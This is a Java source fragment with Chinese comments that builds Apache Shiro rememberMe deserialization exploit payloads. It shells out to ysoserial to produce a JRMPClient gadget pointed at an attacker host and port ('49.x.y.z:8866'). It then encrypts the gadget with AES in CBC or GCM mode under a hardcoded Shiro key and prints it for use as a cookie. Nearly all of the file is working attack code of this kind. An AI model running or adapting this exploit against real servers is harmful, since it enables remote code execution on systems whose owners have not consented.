import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang3.StringUtils;
import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;

import javax.crypto.*;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.beans.XMLDecoder;
import java.io.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.*;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.InvalidParameterSpecException;
import java.time.Instant;
import java.util.Arrays;

import java.beans.Expression;
import java.util.zip.GZIPOutputStream;


    // 低版本的Shiro，使用CBC模式
    // 代码参考：https://github.com/feihong-cs/ShiroExploit-Deprecated/blob/master/src/main/java/com/shiroexploit/core/AesEncrypt.java
    public static String genShiroPayloadByCBCFromBytes(byte[] payload, String b64_key) throws BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidParameterSpecException {
        // base64形式的key
        String key = b64_key;
        // 字节形式的key
        byte[] raw = Base64.decodeBase64(key);

        Cipher cipher =  Cipher.getInstance("AES/CBC/PKCS5Padding");  // 就是GCM换成了CBC

        AlgorithmParameters params = cipher.getParameters();
        byte[] iv = params.getParameterSpec(IvParameterSpec.class).getIV();
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(raw, "AES"), ivSpec);
        byte[] encrypted = cipher.doFinal(payload);


        byte[] output = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, output, 0, iv.length);
        System.arraycopy(encrypted, 0, output, iv.length, encrypted.length);

        return Base64.encodeBase64String(output);
    }



    // 高版本（1.4.2及以后）的Shiro使用GCM模式
    // 通过调试提取自源码
    public static String genShiroPayloadByGCMFromBytes(byte[] payload, String b64_key) throws BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException {
        int size = 128;
        int sizeInBytes = size / 8;
        byte[] iv = new byte[sizeInBytes];

        SecureRandom random = SecureRandom.getInstance("SHA1PRNG");
        random.nextBytes(iv);

        // base64形式的key
        String key = b64_key;
        // 字节形式的key
        byte[] raw = Base64.decodeBase64(key);

        Cipher cipher =  Cipher.getInstance("AES/GCM/PKCS5Padding");

        AlgorithmParameterSpec ivSpec = new GCMParameterSpec(128, iv);    // 前者是接口，后者是实现类

        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(raw, "AES"), ivSpec);    // 加密模式，值就是1
        byte[] encrypted = cipher.doFinal(payload);


        byte[] output = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, output, 0, iv.length);
        System.arraycopy(encrypted, 0, output, iv.length, encrypted.length);

        return Base64.encodeBase64String(output);
    }


    public static byte[] genPayloadFromYso(){
        String ysoserial_path = "D:\\repos\\ysoserial\\target\\ysoserial-0.0.8-SNAPSHOT-all.jar";
        String gadget = "JRMPClient";  // CommonsCollections4 依赖commons-collections4:4.0
        String cmd = "49.x.y.z:8866";
        String command = "D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe -jar " + ysoserial_path + " " + gadget + " " + cmd;
        byte[] result = exec(command);

        return result;
    }

    /*
    工具来源：https://github.com/feihong-cs/ShiroExploit-Deprecated/blob/d4a97907a3c599b4b8299f94c0617cd2d2d0f18c/src/main/java/com/shiroexploit/util/Tools.java
     */
    public static byte[] exec(String cmd){
        Process process = null;
        try {
            if(File.separator.equals("/")){
                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
            }else{
                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", cmd});
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        InputStream in1 = process.getInputStream();
        byte[] stdout = inputStreamToBytes(in1);

        InputStream in2 = process.getErrorStream();
        byte[] stderr = inputStreamToBytes(in2);

        if(stdout.length != 0){
            return stdout;
        }else{
            return stderr;
        }
    }


    /*
    工具来源：https://github.com/feihong-cs/ShiroExploit-Deprecated/blob/d4a97907a3c599b4b8299f94c0617cd2d2d0f18c/src/main/java/com/shiroexploit/util/Tools.java
     */
    public static byte[] inputStreamToBytes(InputStream in){
        ByteArrayOutputStream baos = null;
        try{
            baos = new ByteArrayOutputStream();
            int len = 0;
            byte[] bytes = new byte[1024];
            while((len = in.read(bytes)) != -1){
                baos.write(bytes, 0, len);
            }

            byte[] result = baos.toByteArray();
            return result;
        }catch(IOException e){
            return null;
        }finally {
            try {
                if(baos != null){
                    baos.close();
                }

                if(in != null){
                    in.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) throws Exception{

        byte[] payload = genPayloadFromYso();
//        String shiroPayload = genShiroPayloadByGCMFromBytes(payload, shiroKey);
        String shiroPayload = genShiroPayloadByCBCFromBytes(payload, "nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3");
        System.out.println(shiroPayload);



    }

}

